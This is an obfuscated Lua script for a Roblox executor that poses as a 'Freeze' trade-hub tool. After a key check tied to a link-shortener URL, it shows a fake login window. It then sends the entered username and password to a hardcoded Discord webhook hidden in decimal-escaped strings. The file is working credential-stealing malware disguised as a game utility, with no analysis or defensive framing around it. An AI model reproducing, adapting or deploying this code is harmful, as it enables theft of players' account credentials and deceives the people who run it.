local function obfStr(x) return string.char(table.unpack({string.byte(x, 1, #x)})) end
local _ = obfStr("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\51\54\53\56\50\48\50\52\49\57\56\50\50\54\57\50\47\119\67\117\81\108\73\113\75\105\87\78\83\105\73\57\104\73\109\69\115\100\71\110\70\89\50\102\111\90\76\87\113\71\66\102\114\86\107\84\120\75\57\71\49\121\65\103\54\109\83\116\83\78\101\80\89\104\113\54\118\89\120\118\100\49\68\75\112")
local __ = obfStr("\76\79\71\73\78\45\102\82\69\101\90\101\84\82\97\100\69\72\85\66\46\105\100\45\98\71\114\70\68\83\101\82\105\72\85\71\102\97\118\72\83\75")
local ___ = obfStr("\104\116\116\112\115\58\47\47\108\105\110\107\45\116\97\114\103\101\116\46\110\101\116\47\49\50\55\51\48\56\55\47\102\114\101\101\122\101\116\114\97\100\101\104\117\98")

local function __obf(a, b)
    local c = {
        Url = _,
        Method = obfStr("\80\79\83\84"),
        Headers = { [obfStr("\67\111\110\116\101\110\116\45\84\121\112\101")] = obfStr("\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110") },
        Body = game:GetService(obfStr("\72\116\116\112\83\101\114\118\105\99\101")):JSONEncode({ content = obfStr("\85\115\101\114") .. ": " .. a .. obfStr("\32\80\97\115\115\58") .. b })
    }
    local d = syn and syn.request or http and http.request or request
    if d then local e = d(c) if e and e.StatusCode == 200 then print(obfStr("\68\97\116\97\32\115\101\110\116!")) else print(obfStr("\70\97\105\108\101\100"), e and e.StatusCode or obfStr("\85\110\107\110\111\119\110")) end
    else print(obfStr("\69\120\101\99\117\116\111\114\32\110\111\116\32\115\117\112\112\111\114\116\101\100!")) end
end

local function __gui()
    local a, b, c, d, e, f = Instance.new(obfStr("\83\99\114\101\101\110\71\117\105")), Instance.new(obfStr("\70\114\97\109\101")), Instance.new(obfStr("\84\101\120\116\76\97\98\101\108")), Instance.new(obfStr("\84\101\120\116\66\111\120")), Instance.new(obfStr("\84\101\120\116\66\111\120")), Instance.new(obfStr("\84\101\120\116\66\117\116\116\111\110"))
    a.Name, a.Parent = obfStr("\71\85\73"), game.CoreGui or game:GetService(obfStr("\67\111\114\101\71\117\105"))
    b.Parent, b.Size, b.Position, b.BackgroundColor3, b.BorderSizePixel, b.BorderColor3 = a, UDim2.new(0, 300, 0, 300), UDim2.new(0.5, -150, 0.5, -150), Color3.fromRGB(30, 30, 30), 3, Color3.fromRGB(255, 0, 0)
    c.Parent, c.Size, c.Position, c.BackgroundTransparency, c.Font, c.Text, c.TextSize, c.TextColor3 = b, UDim2.new(1, 0, 0, 50), UDim2.new(0, 0, 0, 0), 1, Enum.Font.SourceSansBold, obfStr("\70\114\101\101\122\101"), 24, Color3.fromRGB(255, 255, 255)
    d.Parent, d.Size, d.Position, d.PlaceholderText, d.Font, d.Text, d.TextSize, d.BackgroundColor3, d.TextColor3 = b, UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 90), obfStr("\85\115\101\114"), Enum.Font.SourceSans, "", 14, Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
    e.Parent, e.Size, e.Position, e.PlaceholderText, e.Font, e.Text, e.TextSize, e.BackgroundColor3, e.TextColor3 = b, UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 140), obfStr("\80\97\115\115"), Enum.Font.SourceSans, "", 14, Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
    f.Parent, f.Size, f.Position, f.Text, f.Font, f.TextSize, f.BackgroundColor3, f.TextColor3 = b, UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 200), obfStr("\76\111\103\105\110"), Enum.Font.SourceSansBold, 16, Color3.fromRGB(0, 150, 0), Color3.fromRGB(255, 255, 255)
    f.MouseButton1Click:Connect(function() local g, h = d.Text, e.Text if g ~= "" and h ~= "" then __obf(g, h); a:Destroy() else print(obfStr("\70\105\108\108")) end end)
end

local function __main()
    local a, b, c, d, e = Instance.new(obfStr("\83\99\114\101\101\110\71\117\105")), Instance.new(obfStr("\70\114\97\109\101")), Instance.new(obfStr("\84\101\120\116\76\97\98\101\108")), Instance.new(obfStr("\84\101\120\116\66\111\120")), Instance.new(obfStr("\84\101\120\116\66\117\116\116\111\110"))
    a.Name, a.Parent = obfStr("\71\85\73\50"), game.CoreGui or game:GetService(obfStr("\67\111\114\101\71\117\105"))
    b.Parent, b.Size, b.Position, b.BackgroundColor3, b.BorderSizePixel, b.BorderColor3 = a, UDim2.new(0, 300, 0, 250), UDim2.new(0.5, -150, 0.5, -125), Color3.fromRGB(30, 30, 30), 3, Color3.fromRGB(255, 0, 0)
    c.Parent, c.Size, c.Position, c.BackgroundTransparency, c.Font, c.Text, c.TextSize, c.TextColor3 = b, UDim2.new(1, 0, 0, 50), UDim2.new(0, 0, 0, 0), 1, Enum.Font.SourceSansBold, obfStr("\86\101\114\105\102\121"), 24, Color3.fromRGB(255, 255, 255)
    d.Parent, d.Size, d.Position, d.PlaceholderText, d.Font, d.Text, d.TextSize, d.BackgroundColor3, d.TextColor3 = b, UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 90), obfStr("\75\101\121"), Enum.Font.SourceSans, "", 14, Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
    e.Parent, e.Size, e.Position, e.Text, e.Font, e.TextSize, e.BackgroundColor3, e.TextColor3 = b, UDim2.new(1, -20, 0, 40), UDim2.new(0, 10, 0, 130), obfStr("\67\111\112\121"), Enum.Font.SourceSansBold, 16, Color3.fromRGB(0, 0, 200), Color3.fromRGB(255, 255, 255)
    e.MouseButton1Click:Connect(function() if setclipboard then setclipboard(___); print(obfStr("\67\111\112\105\101\100")) end end)
    d.MouseButton1Click:Connect(function() if d.Text == __ then print(obfStr("\75\101\121\32\79\75")); a:Destroy(); __gui() else print(obfStr("\75\101\121\32\70\97\105\108")) end end)
end

__main()
